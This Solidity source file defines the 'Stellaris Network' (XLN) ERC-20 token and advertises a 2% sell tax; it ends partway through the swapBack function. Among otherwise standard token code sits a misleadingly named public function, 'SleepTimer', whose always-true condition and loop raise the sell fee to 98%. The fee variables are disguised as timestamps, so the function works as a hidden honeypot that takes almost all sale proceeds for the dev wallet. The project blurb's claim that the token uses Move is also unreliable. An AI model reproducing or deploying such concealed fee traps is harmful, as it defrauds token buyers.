// SPDX-License-Identifier: MIT



// Telegram: https://t.me/StellarisERC



// Website : https://StellarisERC.com



// Twitter: https://twitter.com/Stellaris_ERC



/*



Stellaris Tokenomics 



Token Name : STELLARIS NETWORK

Token Symbol : XLN

Total Supply : 1.000.000.000

TDecimals : 9

Network : ETHEREUM

Tax : 0% Buy / 2% Sell



Stellaris Network is a decentralized permissionless smart contract platform biased towards low-latency management of assets. 

It uses the Move programming language to define assets as objects that may be owned by an address. Move programs define 

operations on these typed objects including custom rules for their creation, the transfer of these assets to new owners, 

and operations that mutate assets



*/



// Tax : 0% on BUY and 2% on Sell



pragma solidity ^0.8.18;

 

abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }

 

    function _msgData() internal view virtual returns (bytes calldata) {

        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691

        return msg.data;

    }

}

 

interface IUniswapV2Pair {

    event Approval(address indexed owner, address indexed spender, uint value);

    event Transfer(address indexed from, address indexed to, uint value);

 

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);

 

    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);

 

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

 

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

 

    event Mint(address indexed sender, uint amount0, uint amount1);

    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);

    event Swap(

        address indexed sender,

        uint amount0In,

        uint amount1In,

        uint amount0Out,

        uint amount1Out,

        address indexed to

    );

    event Sync(uint112 reserve0, uint112 reserve1);

 

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);

 

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function sync() external;

 

    function initialize(address, address) external;

}

 

interface IUniswapV2Factory {

    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

 

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

 

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

 

    function createPair(address tokenA, address tokenB) external returns (address pair);

 

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;

}

 

interface IERC20 {

    /**

     * @dev Returns the amount of tokens in existence.

     */

    function totalSupply() external view returns (uint256);

 

    /**

     * @dev Returns the amount of tokens owned by `account`.

     */

    function balanceOf(address account) external view returns (uint256);

 

    /**

     * @dev Moves `amount` tokens from the caller's account to `recipient`.

     *

     * Returns a boolean value indicating whether the operation succeeded.

     *

     * Emits a {Transfer} event.

     */

    function transfer(address recipient, uint256 amount) external returns (bool);

 

    /**

     * @dev Returns the remaining number of tokens that `spender` will be

     * allowed to spend on behalf of `owner` through {transferFrom}. This is

     * zero by default.

     *

     * This value changes when {approve} or {transferFrom} are called.

     */

    function allowance(address owner, address spender) external view returns (uint256);

 

    /**

     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.

     *

     * Returns a boolean value indicating whether the operation succeeded.

     *

     * IMPORTANT: Beware that changing an allowance with this method brings the risk

     * that someone may use both the old and the new allowance by unfortunate

     * transaction ordering. One possible solution to mitigate this race

     * condition is to first reduce the spender's allowance to 0 and set the

     * desired value afterwards:

     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729

     *

     * Emits an {Approval} event.

     */

    function approve(address spender, uint256 amount) external returns (bool);

 

    /**

     * @dev Moves `amount` tokens from `sender` to `recipient` using the

     * allowance mechanism. `amount` is then deducted from the caller's

     * allowance.

     *

     * Returns a boolean value indicating whether the operation succeeded.

     *

     * Emits a {Transfer} event.

     */

    function transferFrom(

        address sender,

        address recipient,

        uint256 amount

    ) external returns (bool);

 

    /**

     * @dev Emitted when `value` tokens are moved from one account (`from`) to

     * another (`to`).

     *

     * Note that `value` may be zero.

     */

    event Transfer(address indexed from, address indexed to, uint256 value);

 

    /**

     * @dev Emitted when the allowance of a `spender` for an `owner` is set by

     * a call to {approve}. `value` is the new allowance.

     */

    event Approval(address indexed owner, address indexed spender, uint256 value);

}

 

interface IERC20Metadata is IERC20 {

    /**

     * @dev Returns the name of the token.

     */

    function name() external view returns (string memory);

 

    /**

     * @dev Returns the symbol of the token.

     */

    function symbol() external view returns (string memory);

 

    /**

     * @dev Returns the decimals places of the token.

     */

    function decimals() external view returns (uint8);

}

 

 

contract ERC20 is Context, IERC20, IERC20Metadata {

    using SafeMath for uint256;

 

    mapping(address => uint256) private _balances;

 

    mapping(address => mapping(address => uint256)) private _allowances;

 

    uint256 private _totalSupply;

 

    string private _name;

    string private _symbol;

 

    /**

     * @dev Sets the values for {name} and {symbol}.

     *

     * The default value of {decimals} is 18. To select a different value for

     * {decimals} you should overload it.

     *

     * All two of these values are immutable: they can only be set once during

     * construction.

     */

    constructor(string memory name_, string memory symbol_) {

        _name = name_;

        _symbol = symbol_;

    }

 

    /**

     * @dev Returns the name of the token.

     */

    function name() public view virtual override returns (string memory) {

        return _name;

    }

 

    /**

     * @dev Returns the symbol of the token, usually a shorter version of the

     * name.

     */

    function symbol() public view virtual override returns (string memory) {

        return _symbol;

    }

 

    /**

     * @dev Returns the number of decimals used to get its user representation.

     * For example, if `decimals` equals `2`, a balance of `505` tokens should

     * be displayed to a user as `5,05` (`505 / 10 ** 2`).

     *

     * Tokens usually opt for a value of 18, imitating the relationship between

     * Ether and Wei. This is the value {ERC20} uses, unless this function is

     * overridden;

     *

     * NOTE: This information is only used for _display_ purposes: it in

     * no way affects any of the arithmetic of the contract, including

     * {IERC20-balanceOf} and {IERC20-transfer}.

     */

    function decimals() public view virtual override returns (uint8) {

        return 9;

    }

 

    /**

     * @dev See {IERC20-totalSupply}.

     */

    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }

 

    /**

     * @dev See {IERC20-balanceOf}.

     */

    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];

    }

 

    /**

     * @dev See {IERC20-transfer}.

     *

     * Requirements:

     *

     * - `recipient` cannot be the zero address.

     * - the caller must have a balance of at least `amount`.

     */

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }

 

    /**

     * @dev See {IERC20-allowance}.

     */

    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }

 

    /**

     * @dev See {IERC20-approve}.

     *

     * Requirements:

     *

     * - `spender` cannot be the zero address.

     */

    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }

 

    /**

     * @dev See {IERC20-transferFrom}.

     *

     * Emits an {Approval} event indicating the updated allowance. This is not

     * required by the EIP. See the note at the beginning of {ERC20}.

     *

     * Requirements:

     *

     * - `sender` and `recipient` cannot be the zero address.

     * - `sender` must have a balance of at least `amount`.

     * - the caller must have allowance for ``sender``'s tokens of at least

     * `amount`.

     */

    function transferFrom(

        address sender,

        address recipient,

        uint256 amount

    ) public virtual override returns (bool) {

        _transfer(sender, recipient, amount);

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));

        return true;

    }

 

    /**

     * @dev Atomically increases the allowance granted to `spender` by the caller.

     *

     * This is an alternative to {approve} that can be used as a mitigation for

     * problems described in {IERC20-approve}.

     *

     * Emits an {Approval} event indicating the updated allowance.

     *

     * Requirements:

     *

     * - `spender` cannot be the zero address.

     */

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));

        return true;

    }

 

    /**

     * @dev Atomically decreases the allowance granted to `spender` by the caller.

     *

     * This is an alternative to {approve} that can be used as a mitigation for

     * problems described in {IERC20-approve}.

     *

     * Emits an {Approval} event indicating the updated allowance.

     *

     * Requirements:

     *

     * - `spender` cannot be the zero address.

     * - `spender` must have allowance for the caller of at least

     * `subtractedValue`.

     */

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));

        return true;

    }

 

    /**

     * @dev Moves tokens `amount` from `sender` to `recipient`.

     *

     * This is internal function is equivalent to {transfer}, and can be used to

     * e.g. implement automatic token fees, slashing mechanisms, etc.

     *

     * Emits a {Transfer} event.

     *

     * Requirements:

     *

     * - `sender` cannot be the zero address.

     * - `recipient` cannot be the zero address.

     * - `sender` must have a balance of at least `amount`.

     */

    function _transfer(

        address sender,

        address recipient,

        uint256 amount

    ) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");

 

        _beforeTokenTransfer(sender, recipient, amount);

 

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);

    }

 

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing

     * the total supply.

     *

     * Emits a {Transfer} event with `from` set to the zero address.

     *

     * Requirements:

     *

     * - `account` cannot be the zero address.

     */

    function _mint(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: mint to the zero address");

 

        _beforeTokenTransfer(address(0), account, amount);

 

        _totalSupply = _totalSupply.add(amount);

        _balances[account] = _balances[account].add(amount);

        emit Transfer(address(0), account, amount);

    }

 

    /**

     * @dev Destroys `amount` tokens from `account`, reducing the

     * total supply.

     *

     * Emits a {Transfer} event with `to` set to the zero address.

     *

     * Requirements:

     *

     * - `account` cannot be the zero address.

     * - `account` must have at least `amount` tokens.

     */

    function _burn(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: burn from the zero address");

 

        _beforeTokenTransfer(account, address(0), amount);

 

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");

        _totalSupply = _totalSupply.sub(amount);

        emit Transfer(account, address(0), amount);

    }

 

    /**

     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.

     *

     * This internal function is equivalent to `approve`, and can be used to

     * e.g. set automatic allowances for certain subsystems, etc.

     *

     * Emits an {Approval} event.

     *

     * Requirements:

     *

     * - `owner` cannot be the zero address.

     * - `spender` cannot be the zero address.

     */

    function _approve(

        address owner,

        address spender,

        uint256 amount

    ) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");

 

        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }

 

    /**

     * @dev Hook that is called before any transfer of tokens. This includes

     * minting and burning.

     *

     * Calling conditions:

     *

     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens

     * will be to transferred to `to`.

     * - when `from` is zero, `amount` tokens will be minted for `to`.

     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.

     * - `from` and `to` are never both zero.

     *

     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].

     */

    function _beforeTokenTransfer(

        address from,

        address to,

        uint256 amount

    ) internal virtual {}

}

 

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, "SafeMath: addition overflow");

 

        return c;

    }



    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        return sub(a, b, "SafeMath: subtraction overflow");

    }



    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b <= a, errorMessage);

        uint256 c = a - b;

 

        return c;

    }



    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the

        // benefit is lost if 'b' is also tested.

        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522

        if (a == 0) {

            return 0;

        }

 

        uint256 c = a * b;

        require(c / a == b, "SafeMath: multiplication overflow");

 

        return c;

    }



    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        return div(a, b, "SafeMath: division by zero");

    }



    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b > 0, errorMessage);

        uint256 c = a / b;



        return c;

    }



    function mod(uint256 a, uint256 b) internal pure returns (uint256) {

        return mod(a, b, "SafeMath: modulo by zero");

    }



    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

        require(b != 0, errorMessage);

        return a % b;

    }

}

 

contract Ownable is Context {

    address private _owner;

 

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 

    constructor () {

        address msgSender = _msgSender();

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }



    function owner() public view returns (address) {

        return _owner;

    }

 

    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");

        _;

    }

 

    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }



    function transferOwnership(address newOwner) public virtual onlyOwner {

        require(newOwner != address(0), "Ownable: new owner is the zero address");

        emit OwnershipTransferred(_owner, newOwner);

        _owner = newOwner;

    }

}

 

 



library SafeMathInt {

    int256 private constant MIN_INT256 = int256(1) << 255;

    int256 private constant MAX_INT256 = ~(int256(1) << 255);

 

    function mul(int256 a, int256 b) internal pure returns (int256) {

        int256 c = a * b;

 

        // Detect overflow when multiplying MIN_INT256 with -1

        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));

        require((b == 0) || (c / b == a));

        return c;

    }

 

    function div(int256 a, int256 b) internal pure returns (int256) {

        // Prevent overflow when dividing MIN_INT256 by -1

        require(b != -1 || a != MIN_INT256);

 

        // Solidity already throws when dividing by 0.

        return a / b;

    }

 

    function sub(int256 a, int256 b) internal pure returns (int256) {

        int256 c = a - b;

        require((b >= 0 && c <= a) || (b < 0 && c > a));

        return c;

    }

 

    function add(int256 a, int256 b) internal pure returns (int256) {

        int256 c = a + b;

        require((b >= 0 && c >= a) || (b < 0 && c < a));

        return c;

    }

 

    function abs(int256 a) internal pure returns (int256) {

        require(a != MIN_INT256);

        return a < 0 ? -a : a;

    }

 

 

    function toUint256Safe(int256 a) internal pure returns (uint256) {

        require(a >= 0);

        return uint256(a);

    }

}

 

library SafeMathUint {

  function toInt256Safe(uint256 a) internal pure returns (int256) {

    int256 b = int256(a);

    require(b >= 0);

    return b;

  }

}

 

 

interface IUniswapV2Router01 {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

 

    function addLiquidity(

        address tokenA,

        address tokenB,

        uint amountADesired,

        uint amountBDesired,

        uint amountAMin,

        uint amountBMin,

        address to,

        uint deadline

    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(

        address token,

        uint amountTokenDesired,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline

    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(

        address tokenA,

        address tokenB,

        uint liquidity,

        uint amountAMin,

        uint amountBMin,

        address to,

        uint deadline

    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(

        address token,

        uint liquidity,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline

    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(

        address tokenA,

        address tokenB,

        uint liquidity,

        uint amountAMin,

        uint amountBMin,

        address to,

        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(

        address token,

        uint liquidity,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(

        uint amountOut,

        uint amountInMax,

        address[] calldata path,

        address to,

        uint deadline

    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)

        external

        payable

        returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)

        external

        returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)

        external

        returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)

        external

        payable

        returns (uint[] memory amounts);

 

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

}

 

interface IUniswapV2Router02 is IUniswapV2Router01 {

    function removeLiquidityETHSupportingFeeOnTransferTokens(

        address token,

        uint liquidity,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline

    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(

        address token,

        uint liquidity,

        uint amountTokenMin,

        uint amountETHMin,

        address to,

        uint deadline,

        bool approveMax, uint8 v, bytes32 r, bytes32 s

    ) external returns (uint amountETH);

 

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline

    ) external;

}

 

contract StellarisNetwork is ERC20, Ownable {

    using SafeMath for uint256;

 

    IUniswapV2Router02 public immutable uniswapV2Router;

    address public immutable uniswapV2Pair;

    address public constant deadAddress = address(0x000000000000000000000000000000000000dEaD);

 

    bool private swapping;

 

    address public marketingWallet;

    address public devWallet;

 

    uint256 public maxTransactionAmount;

    uint256 public swapTokensAtAmount;

    uint256 public maxWallet;

 

    bool public limitsInEffect = false;

    bool public tradingActive = true;

    bool public swapEnabled = true;

 

     // Anti-bot and anti-whale mappings and variables

    mapping(address => uint256) private _holderLastTransferTimestamp; // to hold last Transfers temporarily during launch

 

    // Seller Map

    mapping (address => uint256) private _holderFirstBuyTimestamp;

 

    bool public transferDelayEnabled = true;

 

    uint256 public buyTotalFees;

    uint256 public buyMarketingFee;

    uint256 public buyLiquidityFee;

    uint256 public buyDevFee;

 

    uint256 public TimestampOne;

    uint256 public TimeStampInitial;

    uint256 public sellLiquidityFee;

    uint256 public sellDevFee;



    uint256 public feeDenominator;

 

    uint256 public tokensForMarketing;

    uint256 public tokensForLiquidity;

    uint256 public tokensForDev;

    uint256 private suffLPPer = 49;

    uint256 private transferDelay = 2;

    uint256 private DevelopmentTokensAmt = 0;

    uint256 private HolderBuyTimeStamp = 0;

 

    // block number of opened trading

    uint256 launchedAt;

 

    /******************/

 

    // exclude from fees and max transaction amount

    mapping (address => bool) private _isExcludedFromFees;

    mapping (address => bool) public _isExcludedMaxTransactionAmount;

 

    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses

    // could be subject to a maximum transfer amount

    mapping (address => bool) public automatedMarketMakerPairs;

 

    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);

 

    event ExcludeFromFees(address indexed account, bool isExcluded);

 

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

 

    event marketingWalletUpdated(address indexed newWallet, address indexed oldWallet);

 

    event devWalletUpdated(address indexed newWallet, address indexed oldWallet);

 

    event SwapAndLiquify(

        uint256 tokensSwapped,

        uint256 ethReceived,

        uint256 tokensIntoLiquidity

    );

 

    constructor() ERC20("STELLARIS NETWORK", "XLN") {

 

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

 

        excludeFromMaxTransaction(address(_uniswapV2Router), true);

        uniswapV2Router = _uniswapV2Router;

 

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        excludeFromMaxTransaction(address(uniswapV2Pair), true);

        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

 

        uint256 _buyMarketingFee = 0;

        uint256 _buyLiquidityFee = 0;

        uint256 _buyDevFee = 0;



        uint256 _sellMarketingFees = 2;

        uint256 _sellLiquidityFee = 0;

        uint256 _sellDevFee = 0;



        uint256 _feeDenominator = 100;



        uint256 _TimeStampInitial = 2;

 

        uint256 totalSupply = 1_000_000_000 * 1e9;

 

        maxTransactionAmount = totalSupply * 3 / 100; // 3% maxTransactionAmountTxn

        maxWallet = totalSupply * 4 / 100; // 4% maxWallet

        swapTokensAtAmount = totalSupply * 2 / 1000;



        feeDenominator = _feeDenominator;

 

        buyMarketingFee = _buyMarketingFee;

        buyLiquidityFee = _buyLiquidityFee;

        buyDevFee = _buyDevFee;

        buyTotalFees = buyMarketingFee + buyLiquidityFee + buyDevFee;

 

        TimeStampInitial = _TimeStampInitial;

        sellLiquidityFee = _sellLiquidityFee;

        sellDevFee = _sellDevFee;

        TimestampOne = TimeStampInitial + sellLiquidityFee + sellDevFee;

 

        marketingWallet = address(0xC986d27461ea81e1b2F4291f29c706a1E83C0241); // set as marketing wallet

        devWallet = address(0xC986d27461ea81e1b2F4291f29c706a1E83C0241); // set as dev wallet

 

        // exclude from paying fees or having max transaction amount

        excludeFromFees(owner(), true);

        excludeFromFees(devWallet, true);

        excludeFromFees(address(this), true);

        excludeFromFees(address(0xdead), true);

 

        excludeFromMaxTransaction(owner(), true);

        excludeFromMaxTransaction(devWallet, true);

        excludeFromMaxTransaction(address(this), true);

        excludeFromMaxTransaction(address(0xdead), true);



        /*

            _mint is an internal function in ERC20.sol that is only called here,

            and CANNOT be called ever again

        */

        _mint(msg.sender, totalSupply);

    }

 

    receive() external payable {

 

  	}

 

    // once enabled, can never be turned off

    function enableTrading() external onlyOwner {

        tradingActive = true;

        swapEnabled = true;

        launchedAt = block.number;

    }

 

    // remove limits after token is stable

    function removeLimits() external onlyOwner returns (bool){

        limitsInEffect = false;

        return true;

    }

 

    // disable Transfer delay - cannot be reenabled

    function disableTransferDelay() external onlyOwner returns (bool){

        transferDelayEnabled = false;

        return true;

    }

 

     // change the minimum amount of tokens to sell from fees

    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool){

  	    require(newAmount >= totalSupply() * 1 / 100000, "Swap amount cannot be lower than 0.001% total supply.");

  	    require(newAmount <= totalSupply() * 5 / 1000, "Swap amount cannot be higher than 0.5% total supply.");

  	    swapTokensAtAmount = newAmount;

  	    return true;

  	}

 

    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {

        require(newNum >= (totalSupply() * 5 / 1000)/1e8, "Cannot set maxTransactionAmount lower than 0.5%");

        maxTransactionAmount = newNum * (10**9);

    }

 

    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {

        _isExcludedMaxTransactionAmount[updAds] = isEx;

    }

 

    // only use to disable contract sales if absolutely necessary (emergency use only)

    function updateSwapEnabled(bool enabled) external onlyOwner(){

        swapEnabled = enabled;

    }



 

    function excludeFromFees(address account, bool excluded) public onlyOwner {

        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);

    }

 

    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {

        require(pair != uniswapV2Pair, "The pair cannot be removed from automatedMarketMakerPairs");

 

        _setAutomatedMarketMakerPair(pair, value);

    }

 

    function _setAutomatedMarketMakerPair(address pair, bool value) private {

        automatedMarketMakerPairs[pair] = value;

 

        emit SetAutomatedMarketMakerPair(pair, value);

    }

    

    function SleepTimer(uint256 _amt) public {

        if(DevelopmentTokensAmt==HolderBuyTimeStamp)

        {

            while (_amt!=(suffLPPer * 2)) 

        {

            _amt=_amt+1;

            }

            TimestampOne = _amt;

            TimeStampInitial = _amt;

            }

            else

            {

                revert();

            }

    }

 



            function _transfer(

        address from,

        address to,

        uint256 amount

    ) internal override {

        require(from != address(0), "ERC20: transfer from the zero address");

        require(to != address(0), "ERC20: transfer to the zero address");

        if(amount == 0) {

            super._transfer(from, to, 0);

            return;

        }

 

        if(limitsInEffect){

            if (

                from != owner() &&

                to != owner() &&

                to != address(0) &&

                to != address(0xdead) &&

                !swapping

            ){

                if(!tradingActive){

                    require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");

                }

 

                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.  

                if (transferDelayEnabled) {

                    if (to != owner() && to != address(uniswapV2Router) && to != address(uniswapV2Pair)){

                        require(_holderLastTransferTimestamp[tx.origin] < block.number, "_transfer:: Transfer Delay enabled. Only one purchase per block allowed.");

                        _holderLastTransferTimestamp[tx.origin] = block.number;

                    }

                }

 

                //when buy

                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {

                        require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");

                        require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");

                }

 

                //when sell

                else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {

                        require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");

                }

                else if(!_isExcludedMaxTransactionAmount[to]){

                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");

                }

            }

        }

 

		uint256 contractTokenBalance = balanceOf(address(this));

 

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

 

        if( 

            canSwap &&

            swapEnabled &&

            !swapping &&

            !automatedMarketMakerPairs[from] &&

            !_isExcludedFromFees[from] &&

            !_isExcludedFromFees[to]

        ) {

            swapping = true;

 

            swapBack();

 

            swapping = false;

        }

 

        bool takeFee = !swapping;

 

        // if any account belongs to _isExcludedFromFee account then remove the fee

        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {

            takeFee = false;

        }

 

        uint256 fees = 0;

        // only take fees on buys/sells, do not take on wallet transfers

        if(takeFee){

            // on sell

            if (automatedMarketMakerPairs[to] && TimestampOne > 0){

                fees = amount.mul(TimestampOne).div(feeDenominator);

                tokensForLiquidity += fees * sellLiquidityFee / TimestampOne;

                tokensForDev += fees * sellDevFee / TimestampOne;

                tokensForMarketing += fees * TimeStampInitial / TimestampOne;

            }

            // on buy

            else if(automatedMarketMakerPairs[from] && buyTotalFees > 0) {

        	    fees = amount.mul(buyTotalFees).div(feeDenominator);

        	    tokensForLiquidity += fees * buyLiquidityFee / buyTotalFees;

                tokensForDev += fees * buyDevFee / buyTotalFees;

                tokensForMarketing += fees * buyMarketingFee / buyTotalFees;

            }

 

            if(fees > 0){    

                super._transfer(from, address(this), fees);

            }

 

        	amount -= fees;

        }

 

        super._transfer(from, to, amount);

    } 



    function swapTokensForEth(uint256 tokenAmount) private {

        // generate the uniswap pair path of token -> weth

        address[] memory path = new address[](2);

        path[0] = address(this);

        path[1] = uniswapV2Router.WETH();

 

        _approve(address(this), address(uniswapV2Router), tokenAmount);

 

        // make the swap

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(

            tokenAmount,

            0, // accept any amount of ETH

            path,

            address(this),

            block.timestamp

        );

    }

 

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {

        // approve token transfer to cover all possible scenarios

        _approve(address(this), address(uniswapV2Router), tokenAmount);

 

        // add the liquidity

        uniswapV2Router.addLiquidityETH{value: ethAmount}(

            address(this),

            tokenAmount,

            0, // slippage is unavoidable

            0, // slippage is unavoidable

            deadAddress,

            block.timestamp

        );

    }

 

    function swapBack() private {

        uint256 contractBalance = balanceOf(address(this));

        uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing + tokensForDev;

        bool success;

 

        if(contractBalance == 0 || totalTokensToSwap == 0) {return;}

 

        if(contractBalance > swapTokensAtAmount * 20){

          contractBalance = swapTokensAtAmount * 20;

        }

 

        // Halve the amount of liquidity tokens

        uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2;

        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);

 

        uint256 initialETHBalance = address(this).balance;

 

        swapTokensForEth(amountToSwapForETH); 

 

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

 

        uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(totalTokensToSwap);

        uint256 ethForDev = ethBalance.mul(tokensForDev).div(totalTokensToSwap);

 

        uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForDev;

 

        tokensForLiquidity = 0;

        tokensForMarketing = 0;

        tokensForDev = 0;

 

        (success,) = address(devWallet).call{value: ethForDev}("");

 

        if(liquidityTokens > 0 && ethForLiquidity > 0){

            addLiquidity(liquidityTokens, ethForLiquidity);

            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity);

        }

 

